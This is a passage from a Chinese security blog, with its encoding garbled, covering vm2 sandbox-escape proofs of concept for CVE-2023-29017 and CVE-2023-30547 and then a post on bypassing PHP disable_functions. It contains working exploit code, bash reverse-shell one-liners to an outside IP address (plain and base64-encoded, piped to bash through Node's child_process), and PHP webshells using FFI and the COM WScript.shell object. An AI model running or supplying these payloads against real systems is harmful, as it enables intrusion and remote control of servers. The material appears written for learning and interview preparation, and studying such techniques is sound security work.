<p>tmpnameçš„å€¼è¢«å®šä¹‰ä¸º<code>VM2_INTERNAL_TMPNAME</code></p>
<p><img src="/posts/bfeb5984/39.png" alt="img"></p>
<p>åœ¨pocä¸­ æ”»å‡»è€…æ„é€ äº† <code>a$tmpname</code> ï¼Œç»è¿‡å‡½æ•°å¤„ç†åå˜ä¸º <code>aVM2_INTERNAL_TMPNAME</code>ï¼Œè€Œåœ¨pocä¸­æˆ‘ä»¬å·²æå‰å®šä¹‰å¥½äº†<code>aVM2_INTERNAL_TMPNAME</code>è¿™ä¸ªå˜é‡ï¼Œä½¿å¾—è¿™ä¸ªå˜é‡ä½œä¸ºå®¿ä¸»å¯¹è±¡å¯ä»¥æœªç»ä¿æŠ¤ç›´æ¥ä½¿ç”¨ï¼Œä»è€Œå®ç°äº†å¯¹<code>handleException()</code>çš„ç»•è¿‡</p>
<p>poc <a href="https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c">https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">aVM2_INTERNAL_TMPNAME = &#123;&#125;;</span></span><br><span class="line"><span class="string">function stack() &#123;</span></span><br><span class="line"><span class="string">    new Error().stack;</span></span><br><span class="line"><span class="string">    stack();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    stack();</span></span><br><span class="line"><span class="string">&#125; catch (a$tmpname) &#123;</span></span><br><span class="line"><span class="string">    a$tmpname.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch pwned&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2023-30547"><a href="#CVE-2023-30547" class="headerlink" title="CVE-2023-30547"></a>CVE-2023-30547</h4><p>&lt;= 3.9.16</p>
<p>POC <a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">err = &#123;&#125;;</span></span><br><span class="line"><span class="string">const handler = &#123;</span></span><br><span class="line"><span class="string">    getPrototypeOf(target) &#123;</span></span><br><span class="line"><span class="string">        (function stack() &#123;</span></span><br><span class="line"><span class="string">            new Error().stack;</span></span><br><span class="line"><span class="string">            stack();</span></span><br><span class="line"><span class="string">        &#125;)();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">const proxiedErr = new Proxy(err, handler);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    throw proxiedErr;</span></span><br><span class="line"><span class="string">&#125; catch (&#123;constructor: c&#125;) &#123;</span></span><br><span class="line"><span class="string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch pwned&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure>







<hr>
<h3 id="nodejsä¸‹æ¼æ´åˆ©ç”¨"><a href="#nodejsä¸‹æ¼æ´åˆ©ç”¨" class="headerlink" title="nodejsä¸‹æ¼æ´åˆ©ç”¨"></a>nodejsä¸‹æ¼æ´åˆ©ç”¨</h3><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><p>bash -i &gt;&amp; /dev/tcp/106.52.221.71/8888 0&gt;&amp;1</p>
<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==</p>
<p>require(â€˜child_processâ€™).exec(â€˜echo SHELL_BASE_64|base64 -d|bashâ€™);</p>
<p>require(â€˜child_processâ€™).exec(â€˜echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==|base64 -d|bashâ€™);</p>
<p>require(â€˜child_processâ€™).exec(â€˜echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==|base64 -d|bashâ€™);</p>
<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/80 0&gt;&amp;1</p>
<p>çœ‹ä¸€ä¸‹ child_process å­è¿›ç¨‹ç›¸å…³æ‰‹å†Œ <a href="https://nodejs.cn/api-v16/child_process.html">https://nodejs.cn/api-v16/child_process.html</a></p>
<p><a href="https://xz.aliyun.com/t/9167">https://xz.aliyun.com/t/9167</a>  nodejsä¸‹æ¼æ´åˆ©ç”¨</p>
<h4 id="child-processæ¨¡å—"><a href="#child-processæ¨¡å—" class="headerlink" title="child_processæ¨¡å—"></a>child_processæ¨¡å—</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo SHELL_BASE_64|base64 -d|bash&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAgMD4mMQ==|base64 -d|bash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvODAgMD4mMQ==|base64 -d|bash&#x27;</span>);</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">80</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="title class_">YmFzaCAtaSA</span>+<span class="title class_">JiAvZGV2L3RjcC8</span>xMjcuMC4wLjEvODAgMD4mMQ==</span><br><span class="line">  </span><br><span class="line">æ³¨æ„ï¼š<span class="title class_">BASE64</span>åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹)</span><br></pre></td></tr></table></figure>



<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-29017">https://nvd.nist.gov/vuln/detail/CVE-2023-29017</a></p>
<p><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>
<p><a href="https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg">https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg</a></p>
<p><a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>
<p><a href="https://xz.aliyun.com/t/9167">https://xz.aliyun.com/t/9167</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/16899212.html">https://www.cnblogs.com/zpchcbd/p/16899212.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Disable_functions Bypass</title>
    <url>/posts/fbcae803/</url>
    <content><![CDATA[<p>é€šå¸¸æƒ…å†µä¸‹ å¯¼è‡´webshellä¸èƒ½æ‰§è¡Œå‘½ä»¤åˆä¸‰ç±»åŸå› :</p>
<ul>
<li><ol>
<li>php.iniä¸­ä½¿ç”¨disable_funcitonsç¦ç”¨äº†system() exec()ç­‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°</li>
</ol>
</li>
<li><ol start="2">
<li>æœ‰WAFæ‹¦æˆª</li>
</ol>
</li>
<li><ol start="3">
<li>webè¿›ç¨‹è¿è¡Œåœ¨rbashç±»å—é™åˆ¶çš„shellç¯å¢ƒä¸‹</li>
</ol>
</li>
</ul>
<p>å¦‚æœæ˜¯ç¬¬ä¸€ç§åˆ™æ— æ³•æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œå¦å¤–ä¸¤ç§å¯ä»¥æ‰§è¡Œå°‘é‡å‘½ä»¤ã€‚</p>
<p>åœ¨æ‹¿åˆ°çš„æœ‰äº› webshellä¸­ï¼Œåœ¨æ‰§è¡Œå‘½ä»¤æ—¶è¿”å›  <code>ret=127</code>ï¼Œè¿™æ˜¯ç”±äºdisable_functions çš„é™åˆ¶ï¼Œæœ€è¿‘æœ‰é¢è¯•å®˜é—®åˆ°è¿‡è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯ç”±äºå¾ˆä¹…æ²¡æ¥è§¦ï¼Œä»¥å‰å¤§å¤šæ˜¯ä½¿ç”¨èšå‰‘æ’ä»¶ç»•è¿‡ï¼Œåœ¨æ€»ç»“å¤ç°å­¦ä¹ ä¸‹bypassæŠ€å·§ã€‚</p>
<h4 id="Disable-functions"><a href="#Disable-functions" class="headerlink" title="Disable_functions"></a>Disable_functions</h4><p>disable_functions æ˜¯ php.iniä¸­çš„ä¸€ä¸ªè®¾ç½®é€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®phpç¯å¢ƒç¦æ­¢ä½¿ç”¨æŸäº›å‡½æ•°ï¼Œä¸»è¦æ˜¯ç”¨æ¥ç¦æ­¢æŸäº›èƒ½å¤Ÿæ‰§è¡Œå±é™©å‘½ä»¤çš„å‡½æ•°</p>
<p><img src="/posts/fbcae803/1.png" alt="img"></p>
<p>é€šå¸¸åœ¨æ‹¿åˆ°ä¸€ä¸ªwebshell ä½¿ç”¨ç®¡ç†å·¥å…·è¿æ¥æ‰§è¡Œå‘½ä»¤å´è¿”å› <code>ret=127 </code> è¿™ç§å°±æ˜¯è¢«disable_functions æ‰€é™åˆ¶äº†ã€‚</p>
<h4 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h4><p>æœ‰äº›è¿ç»´äººå‘˜å¯èƒ½æ²¡æœ‰å°†phpå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ç¦ç”¨å®Œï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open</span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨PHP-7-4-FFI-ç»•è¿‡"><a href="#åˆ©ç”¨PHP-7-4-FFI-ç»•è¿‡" class="headerlink" title="åˆ©ç”¨PHP 7.4 FFI ç»•è¿‡"></a>åˆ©ç”¨PHP 7.4 FFI ç»•è¿‡</h4><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ol>
<li>Linux æ“ä½œç³»ç»Ÿ</li>
<li>PHP&gt;= 7.4</li>
<li>å¼€å¯äº†FFIæ‹“å±•ä¸” ffi.enable=true</li>
</ol>
<h5 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h5><p>FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œå…è®¸ä»ç”¨æˆ·åŒºè°ƒç”¨Cä»£ç ã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸€é¡¹è®©ä½ åœ¨PHPé‡Œèƒ½å¤Ÿè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</p>
<p>å½“æ‰€æœ‰çš„PHPå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è¢«ç¦ç”¨åï¼Œå¯ä»¥ç”¨è¿‡PHP7.4çš„æ–°ç‰¹æ€§FFIè°ƒç”¨Cä»£ç çš„æ–¹å¼ã€‚</p>
<p>å…ˆå£°æ˜Cä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€Œsystem()ã€ï¼Œåœ¨é€šè¿‡FFIå˜é‡è°ƒç”¨system() ç»•è¿‡PHPä¸­çš„systemå‡½æ•°</p>
<p>æŸ¥çœ‹FFIæ˜¯å¦å¼€å¯  ffi.enable è®¾ç½®ä¸ºTRUE</p>
<p><img src="/posts/fbcae803/2.png" alt="img"></p>
<h5 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>ä½¿ç”¨  <code>FFI::cdef</code>  //åˆ›å»ºä¸€ä¸ªæ–°çš„FFIå¯¹è±¡</p>
<p>é€šè¿‡C çš„ <code>system()</code>å»æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="comment">//ç”±GETä¼ å‚çš„ä»»æ„ä»£ç æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®  ip/1.php?cmd=whoami </p>
<h4 id="åˆ©ç”¨Linuxç¯å¢ƒå˜é‡-LD-PRELOADç»•è¿‡"><a href="#åˆ©ç”¨Linuxç¯å¢ƒå˜é‡-LD-PRELOADç»•è¿‡" class="headerlink" title="åˆ©ç”¨Linuxç¯å¢ƒå˜é‡ LD_PRELOADç»•è¿‡"></a>åˆ©ç”¨Linuxç¯å¢ƒå˜é‡ LD_PRELOADç»•è¿‡</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºåŠ¨æ€åº“çš„åŠ è½½</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹åŠ¨æ€åº“çš„æœç´¢é¡ºåºï¼š</p>
<ul>
<li>ç¼–è¯‘ç›®æ ‡ä»£ç æ—¶çŸ¥é“çš„åŠ¨æ€åº“æœç´¢è·¯å¾„LD_PRELOAD</li>
<li>ç¯å¢ƒå˜é‡LD_LIBRARY_PATHæŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„</li>
<li>é…ç½®æ–‡ä»¶/etc/ld.so.confä¸­æŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„</li>
<li>é»˜è®¤çš„åŠ¨æ€åº“æœç´¢è·¯å¾„ /lib</li>
<li>é»˜è®¤çš„åŠ¨æ€åº“æœç´¢è·¯å¾„ /usr/lib</li>
</ul>
<p>LD_PRELOADçš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œå› è€Œå¯ä»¥å½±å“ç¨‹åºè¿è¡Œæ—¶çš„é“¾æ¥ï¼Œè¿è¡Œç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚</p>
<p>å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡LD_PRELOADåŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œå¯ä»¥è¾¾åˆ°ä¸è°ƒç”¨PHPçš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€Œsystem() exec()ç­‰ã€ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚</p>
<h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>1.æœ¬åœ°ä¼ªé€ .c æ–‡ä»¶åŠ«æŒæŸä¸ªå‡½æ•°å¹¶ç”Ÿæˆä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“.so æ–‡ä»¶</p>
<p>2.ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨æœ‰æƒé™çš„ç›®å½•ä¸‹</p>
<p>3.åˆ©ç”¨phpä¸­çš„putenv()è®¾ç½®LD_PRELOADè·¯å¾„ä¸ºè¯¥æ–‡ä»¶</p>
<p>4.é…åˆphpä¸­æŸä¸ªå‡½æ•°å»å¨æˆ¿æ„é€ çš„åŠ¨æ€é“¾æ¥åº“ .soæ–‡ä»¶</p>
<p>5.æ‰§è¡Œå‘½ä»¤</p>
<h5 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><p>PHPæ”¯æŒputenv() mail()å‡½æ•°  ã€Œæ— éœ€å®‰è£…sendmailã€</p>
<p>æ–‡ç« å¯è§ <a href="https://www.freebuf.com/web/192052.html">https://www.freebuf.com/web/192052.html</a></p>
<h5 id="åˆ©ç”¨æ–¹æ³•-1"><a href="#åˆ©ç”¨æ–¹æ³•-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>é¡¹ç›®åœ°å€: <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>è¯¥é¡¹ç›®ä¸­æœ‰ä¸‰ä¸ªå…³é”®æ–‡ä»¶ï¼Œbypass_disablefunc.phpã€bypass_disablefunc_x64.soã€bypass_disablefunc_x86.soã€‚ </p>
<p>bypass_disablefunc.php ä¸ºå‘½ä»¤æ‰§è¡Œ webshellï¼Œæä¾›ä¸‰ä¸ª GET å‚æ•°ï¼š</p>
<p><a href="http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</a> </p>
<p>cmdå‚æ•° æ‰§è¡Œå‘½ä»¤</p>
<p>outpathå‚æ•° ä¿å­˜å‘½ä»¤æ‰§è¡Œè¾“å‡ºç»“æœçš„æ–‡ä»¶è·¯å¾„ã€Œæ³¨æ„ web æ˜¯å¦æœ‰è¯»å†™æƒé™ã€web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®ã€æ–‡ä»¶å°†è¢«è¦†ç›–å’Œåˆ é™¤ç­‰å‡ ç‚¹ã€</p>
<p>sopathå‚æ•°  æŒ‡å®šåŠ«æŒç³»ç»Ÿå‡½æ•°çš„å…±äº«å¯¹è±¡çš„ç»å¯¹è·¯å¾„</p>
<p>å°† bypass_disablefunc.php å’Œ bypass_disablefunc_x64.so ä¼ åˆ°ç›®æ ‡æœ‰æƒé™çš„ç›®å½•ä¸‹ï¼ŒæŒ‡å®šå¥½ä¸‰ä¸ª GET å‚æ•°åï¼Œå¹¶ç”¨includeå»åŒ…å«bypass_disablefunc.php å³å¯çªç ´ disable_functionsã€‚</p>
<h4 id="åˆ©ç”¨Windows-COMç»„ä»¶ç»•è¿‡"><a href="#åˆ©ç”¨Windows-COMç»„ä»¶ç»•è¿‡" class="headerlink" title="åˆ©ç”¨Windows COMç»„ä»¶ç»•è¿‡"></a>åˆ©ç”¨Windows COMç»„ä»¶ç»•è¿‡</h4><h5 id="åˆ©ç”¨æ¡ä»¶-2"><a href="#åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><p>1.Windowsç¯å¢ƒ</p>
<p>2.å¼€å¯COMç»„ä»¶ã€Œ5.4è‡ªå¸¦ å…¶ä»–ç‰ˆæœ¬è‡ªè¡Œæ·»åŠ ã€</p>
<p><img src="/posts/fbcae803/3.png" alt="img"></p>
<p>å¦‚æœåœ¨phpinfoä¸­ com_dotnetä¸‹  com.allow_dcom   è¡¨ç¤ºCOMç»„ä»¶å¼€å¯ã€‚å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªCOMå¯¹è±¡ï¼Œé€šè¿‡è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä»¥ç»•è¿‡disable_functions</p>
<h5 id="åˆ©ç”¨æ–¹æ³•-2"><a href="#åˆ©ç”¨æ–¹æ³•-2" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>ä¸Šä¼ phpè„šæœ¬ åä¼ å‚æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>] : <span class="string">&#x27;wscript&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;wscript&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Create Wscript.Shell Failed!&quot;</span>); <span class="comment">//ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡</span></span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>);	<span class="comment">//è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">    <span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;application&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&quot;Shell.Application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Shell.Application Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">ShellExecute</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨æ”»å‡»PHP-FPM"><a href="#åˆ©ç”¨æ”»å‡»PHP-FPM" class="headerlink" title="åˆ©ç”¨æ”»å‡»PHP-FPM"></a>åˆ©ç”¨æ”»å‡»PHP-FPM</h4><h5 id="åˆ©ç”¨æ¡ä»¶-3"><a href="#åˆ©ç”¨æ¡ä»¶-3" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ol>
<li>Linuxæ“ä½œç³»ç»Ÿ</li>
<li>PHP-FPM</li>
<li>å­˜åœ¨å¯å†™ç›®å½• éœ€ä¸Šä¼ .soæ–‡ä»¶</li>
</ol>
<h5 id="æ¼æ´ç¯å¢ƒ"><a href="#æ¼æ´ç¯å¢ƒ" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h5><p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p>
<p>git clone <a href="https://github.com/AntSwordProject/AntSword-Labs.git">https://github.com/AntSwordProject/AntSword-Labs.git</a> </p>
<p>cd AntSword-Labs/bypass_disable_functions/5 </p>
<p>docker-compose up -d</p>
<h5 id="åˆ©ç”¨æ–¹æ³•-3"><a href="#åˆ©ç”¨æ–¹æ³•-3" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>è¿æ¥shellåæ— æ³•æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/fbcae803/4.png" alt="img"></p>
<p>é€šè¿‡phpinfo å‘ç°è¯¥ä¸»æœºé…ç½®äº† FPM/Fastcgi</p>
<p><img src="/posts/fbcae803/5.png" alt="img"></p>
<p>ä½¿ç”¨æ’ä»¶</p>
<p>éœ€è¦å…ˆæ‰¾åˆ°FPMæ¥å£åœ°å€</p>
<p><img src="/posts/fbcae803/6.png" alt="img"></p>
<p><img src="/posts/fbcae803/7.png" alt="img"></p>
<p>éšååœ¨ /var/www/html/ ç›®å½•ä¸‹ä¾¿æ–°å»ºäº†ä¸€ä¸ª .antproxy.phpæ–‡ä»¶ã€Œantã€ è¿æ¥shellåä¾¿å¯æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/fbcae803/8.png" alt="img"></p>
<h4 id="åˆ©ç”¨Apache-Mod-CGI"><a href="#åˆ©ç”¨Apache-Mod-CGI" class="headerlink" title="åˆ©ç”¨Apache Mod CGI"></a>åˆ©ç”¨Apache Mod CGI</h4><h5 id="åˆ©ç”¨æ¡ä»¶-4"><a href="#åˆ©ç”¨æ¡ä»¶-4" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ol>
<li>Linuxæ“ä½œç³»ç»Ÿ</li>
<li>Apache + PHPã€ŒApacheä½¿ç”¨ apache_mod_phpã€</li>
<li>Apcheå¼€å¯ cgiå’Œrewrite</li>
<li>Webç›®å½•å…·æœ‰AllowOverride æƒé™</li>
<li>å½“å‰ç›®å½•å¯å†™</li>
</ol>
<h5 id="å…³äºmod-cgi"><a href="#å…³äºmod-cgi" class="headerlink" title="å…³äºmod_cgi"></a>å…³äºmod_cgi</h5><p><a href="http://httpd.apache.org/docs/current/mod/mod_cgi.html">http://httpd.apache.org/docs/current/mod/mod_cgi.html</a></p>
<p>ä»»ä½•å…·æœ‰MIMEç±»å‹application/x-httpd-cgiæˆ–è€…è¢«cgi-scriptå¤„ç†å™¨å¤„ç†çš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºCGIè„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œï¼Œå®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
<p>å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸ºCGIè„šæœ¬ï¼Œä¸€ç§æ˜¯æ–‡ä»¶å…·æœ‰å·²ç”±AddTypeæŒ‡ä»¤å®šä¹‰çš„æ‰©å±•åï¼Œå¦ä¸€ç§æ˜¯æ–‡ä»¶ä½äºScriptAliasç›®å½•ä¸­ã€‚</p>
